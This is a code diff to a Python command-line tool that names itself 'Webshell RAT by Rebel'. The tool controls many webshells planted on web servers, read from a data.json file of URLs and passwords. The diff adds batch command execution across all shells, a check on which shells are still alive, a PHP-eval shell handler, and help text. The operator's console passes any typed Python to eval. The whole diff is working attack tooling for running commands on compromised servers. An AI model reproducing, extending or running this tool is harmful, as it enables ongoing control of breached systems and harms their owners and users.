@@ -7,7 +7,7 @@ import readline
 import concurrent.futures
 
 def completer(text, state):
-    func = ['WebshellRAT', 'BatchExec', 'BatchRequests', 'webshells']
+    func = ['WebshellRAT', 'WebshellRAT.batchExec', 'WebshellRAT.batchRequests', 'webshells', 'php_eval_default', 'exec_default']
     matches = [f for f in func if f.startswith(text)]
     if state < len(matches):
         return matches[state]
@@ -16,7 +16,15 @@ def completer(text, state):
 
 readline.parse_and_bind('tab: complete')
 readline.set_completer(completer)
+help_info='''
+\033[31mWebshell RAT by Rebel.\033[0m
+\033[33mHow to add webshell?\033[0m
+    Add your Webshell to data.json, There must be 'func' / 'url' / 'passwd' argument, and of course you can customize everything, because this tool is only about your functions !
+    eg. { "func":"exec_default", "url":"http://127.0.0.1/shell.php", "passwd":"pass"}
 
+\033[33mHow do you control the webshell?\033[0m
+  After 'WebshellRAT >> ' is displayed, enter any python3 code you want to execute will be eval, the variable wbshells stores all webshells from data.json, and you can execute the command via webshells[0].exec('ls'). 
+'''
 class Webshell:
     def __init__(self):
         self.func=None
@@ -29,7 +37,10 @@ class Webshell:
         return f"{self.webshellJson['url']}"
 
     def exec(self, payload):
-        return self.func(self.webshellJson, payload=payload)
+        result = self.func(self.webshellJson, payload=payload)
+        print(f'\033[32m{self.webshellJson["url"]} Execute --------\033[0m')
+        print(result if result else f'[{self.webshellJson["url"]}] {payload} Execute Failed....  :(')
+        return result
 
 class RAT:
     def __init__(self):
@@ -66,7 +77,19 @@ class RAT:
         with concurrent.futures.ThreadPoolExecutor( max_workers=5 ) as Executor:
             future = Executor.submit( func, webshellJson)
             return future
-        
+
+    def batchRequests(self):
+        for webshell in self.webshells:
+            webshell_url = webshell.webshellJson.get('url')
+            response = requests.get(webshell_url) 
+            if response.status_code==200:
+                print( f"\033[32m    [{response.status_code}]  {webshell_url}\033[0m" )
+            else:
+                print( f"\033[31m    [{response.status_code}]  {webshell_url}\033[0m" )
+
+    def batchExec(self, func, payload):
+        return [ _webshell.exec(payload) for _webshell in self.webshells if _webshell.webshellJson['func']==func ]
+            
 def exec_default(webshellJson, payload="echo 'r4be1'"):
     randomString1 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
     randomString2 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
@@ -75,21 +98,20 @@ def exec_default(webshellJson, payload="echo 'r4be1'"):
             url = webshellJson['url'],
             data = {webshellJson['passwd'] : payload}
             )
-    result = re.search(f"{randomString1}(.*?){randomString2}", response.text)
-    return result.group(1) if result else None
+    result = response.text[response.text.find(randomString1)+len(randomString1):response.text.find(randomString2)] if (randomString1 in response.text) and (randomString2 in response.text) else None
+    return result
 
-def BatchRequests():
-    for webshell in WebshellRAT.webshells:
-        webshell_url = webshell.webshellJson.get('url')
-        response = requests.get(webshell_url) 
-        if response.status_code==200:
-            print( f"\033[32m    [{response.status_code}]  {webshell_url}\033[0m" )
-        else:
-            print( f"\033[31m    [{response.status_code}]  {webshell_url}\033[0m" )
+def php_eval_default(webshellJson, payload="echo 'r4be1'"):
+    randomString1 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
+    randomString2 = "".join( random.sample(list('qwetuiopasfgjklzxvbnm'),7) )
+    payload = f"echo {randomString1};{payload};echo {randomString2};"
+    response = requests.post(
+            url = webshellJson['url'],
+            data = {webshellJson['passwd'] : payload}
+            )
+    result = response.text[response.text.find(randomString1)+len(randomString1):response.text.find(randomString2)] if (randomString1 in response.text) and (randomString2 in response.text) else None
+    return result
 
-def BatchExec(payload):
-    for webshell in WebshellRAT.webshells:
-        webshell.exec(payload)
 
 WebshellRAT=RAT()
 webshells=WebshellRAT.webshells
@@ -100,7 +122,10 @@ while True:
         readline.add_history(_)
         if _ == "exit":
             break
-        eval(_)
+        elif _ == "help":
+            print(help_info)
+        else:
+            eval(_)
 
     except KeyboardInterrupt:
         print("\n")
